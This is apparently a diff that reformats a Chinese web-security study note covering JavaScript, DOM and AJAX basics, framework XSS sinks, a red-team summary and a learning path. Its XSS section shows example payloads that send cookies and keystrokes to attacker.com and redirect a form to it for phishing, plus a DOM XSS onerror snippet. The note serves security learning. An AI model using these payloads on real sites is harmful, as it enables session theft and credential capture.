+ 4. 表单自动填充可能泄露敏感信息
 
 【JavaScript基础】
 
  JavaScript在浏览器中的作用：
-  - 操作DOM（Document Object Model）修改页面内容
-  - 处理用户事件（点击、输入等）
-  - 发送AJAX请求（与服务器异步交互）
-  - 操作Cookie/LocalStorage
+ - 操作DOM（Document Object Model）修改页面内容
+ - 处理用户事件（点击、输入等）
+ - 发送AJAX请求（与服务器异步交互）
+ - 操作Cookie/LocalStorage
 
  XSS攻击中的核心JavaScript：
 ```javascript
-  // 窃取Cookie
-  <script>
-  fetch('http://attacker.com/steal?c=' + document.cookie);
-  </script>
+ // 窃取Cookie
+ <script>
+ fetch('http://attacker.com/steal?c=' + document.cookie);
+ </script>
 
-  // 键盘记录
-  <script>
-  document.onkeypress = function(e) {
-    fetch('http://attacker.com/key?k=' + e.key);
-  };
-  </script>
+ // 键盘记录
+ <script>
+ document.onkeypress = function(e) {
+ fetch('http://attacker.com/key?k=' + e.key);
+ };
+ </script>
 
-  // 修改表单提交目标（钓鱼）
-  <script>
-  document.forms[0].action = 'http://attacker.com/steal';
-  </script>
+ // 修改表单提交目标（钓鱼）
+ <script>
+ document.forms[0].action = 'http://attacker.com/steal';
+ </script>
 ```
 
  DOM基础：
-  document.getElementById('id')       // 通过ID获取元素
-  document.querySelector('.class')    // 通过CSS选择器获取
-  element.innerHTML = '...'           // 修改元素HTML内容(危险!)
-  element.innerHTML = '<img src=x onerror=alert(1)>'  // DOM型XSS
-  document.cookie                     // 读取Cookie
-  window.location                     // URL信息
+ document.getElementById('id') // 通过ID获取元素
+ document.querySelector('.class') // 通过CSS选择器获取
+ element.innerHTML = '...' // 修改元素HTML内容(危险!)
+ element.innerHTML = '<img src=x onerror=alert(1)>' // DOM型XSS
+ document.cookie // 读取Cookie
+ window.location // URL信息
 
  AJAX (Asynchronous JavaScript and XML)：
-  现代Web应用的核心，可以不刷新页面与服务器通信。
+ 现代Web应用的核心，可以不刷新页面与服务器通信。
 
-  // 原生XHR
-  var xhr = new XMLHttpRequest();
-  xhr.open('POST', '/api/data', true);
-  xhr.setRequestHeader('Content-Type', 'application/json');
-  xhr.onreadystatechange = function() {
-    if (xhr.readyState == 4) {
-      console.log(xhr.responseText);  // dangerouslySetInnerHTML? DOM XSS!
-    }
-  };
-  xhr.send(JSON.stringify({key: 'value'}));
+ // 原生XHR
+ var xhr = new XMLHttpRequest();
+ xhr.open('POST', '/api/data', true);
+ xhr.setRequestHeader('Content-Type', 'application/json');
+ xhr.onreadystatechange = function() {
+ if (xhr.readyState == 4) {
+ console.log(xhr.responseText); // dangerouslySetInnerHTML? DOM XSS!
+ }
+ };
+ xhr.send(JSON.stringify({key: 'value'}));
 
-  // Fetch API (现代)
-  fetch('/api/data', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({key: 'value'})
-  }).then(r => r.json()).then(data => console.log(data));
+ // Fetch API (现代)
+ fetch('/api/data', {
+ method: 'POST',
+ headers: {'Content-Type': 'application/json'},
+ body: JSON.stringify({key: 'value'})
+ }).then(r => r.json()).then(data => console.log(data));
 
  前端框架基础概念（了解即可）：
-  React/Vue/Angular都使用"虚拟DOM"和"组件化"，引入了新的安全问题：
-  - React dangerouslySetInnerHTML → 可能导致DOM XSS
-  - Vue v-html → 可能导致DOM XSS
-  - Angular bypassSecurityTrustHtml → 可能导致DOM XSS
-  - SPA路由中的开放重定向
-  - SSR(服务端渲染)中的SSRF
+ React/Vue/Angular都使用"虚拟DOM"和"组件化"，引入了新的安全问题：
+ - React dangerouslySetInnerHTML → 可能导致DOM XSS
+ - Vue v-html → 可能导致DOM XSS
+ - Angular bypassSecurityTrustHtml → 可能导致DOM XSS
+ - SPA路由中的开放重定向
+ - SSR(服务端渲染)中的SSRF
 
 ## 十一、红队视角总结
 
  Web渗透测试的核心技术链条：
-  信息收集 → 漏洞发现 → 漏洞利用 → 权限提升 → 横向移动
+ 信息收集 → 漏洞发现 → 漏洞利用 → 权限提升 → 横向移动
 
  必须掌握的Web技能：
-  1. 抓包修改：Burp Suite / OWASP ZAP
-  2. 理解每个请求头/响应头的意义
-  3. 会手工构造HTTP请求（curl, python requests, Burp Repeater）
-  4. JS调试基本功（浏览器DevTools）
-  5. 编码解码随手就来（CyberChef是你的朋友）
+ 1. 抓包修改：Burp Suite / OWASP ZAP
+ 2. 理解每个请求头/响应头的意义
+ 3. 会手工构造HTTP请求（curl, python requests, Burp Repeater）
+ 4. JS调试基本功（浏览器DevTools）
+ 5. 编码解码随手就来（CyberChef是你的朋友）
 
  经典Web漏洞一句话概括：
-  - SQL注入:     用户输入拼接进SQL查询,未参数化
-  - XSS:         用户输入被直接插入HTML中
-  - CSRF:        跨站请求在用户不知情时执行
-  - SSRF:        服务器端请求被用户控制
-  - XXE:         XML解析器处理外部实体定义
-  - 文件包含:    文件路径被用户参数控制
-  - 文件上传:    未充分校验上传文件类型和内容
-  - 命令注入:    用户输入拼接进系统命令
-  - 反序列化:    不可信的序列化数据被反序列化
+ - SQL注入: 用户输入拼接进SQL查询,未参数化
+ - XSS: 用户输入被直接插入HTML中
+ - CSRF: 跨站请求在用户不知情时执行
+ - SSRF: 服务器端请求被用户控制
+ - XXE: XML解析器处理外部实体定义
+ - 文件包含: 文件路径被用户参数控制
+ - 文件上传: 未充分校验上传文件类型和内容
+ - 命令注入: 用户输入拼接进系统命令
+ - 反序列化: 不可信的序列化数据被反序列化
 
-  推荐学习路径：
-   1. 熟练使用Burp Suite所有核心功能
-   2. 搭建DVWA/WebGoat/PortSwigger Web Academy练习
-   3. 阅读OWASP Testing Guide
-   4. 深入理解一到两种后端语言(PHP首选，Java其次)
-   5. 学会用浏览器DevTools调试JS
+ 推荐学习路径：
+ 1. 熟练使用Burp Suite所有核心功能
+ 2. 搭建DVWA/WebGoat/PortSwigger Web Academy练习
+ 3. 阅读OWASP Testing Guide
+ 4. 深入理解一到两种后端语言(PHP首选，Java其次)
+ 5. 学会用浏览器DevTools调试JS
 
  进阶前端知识：
-   深入学习 [[../前端基础/前端基础总目录|前端基础]] 中的HTML注入、CSS泄露、
-   JS原型链污染、CSTI、现代框架安全等高级主题。
+ 深入学习 [[../前端基础/前端基础总目录|前端基础]] 中的HTML注入、CSS泄露、
+ JS原型链污染、CSTI、现代框架安全等高级主题。
 
 
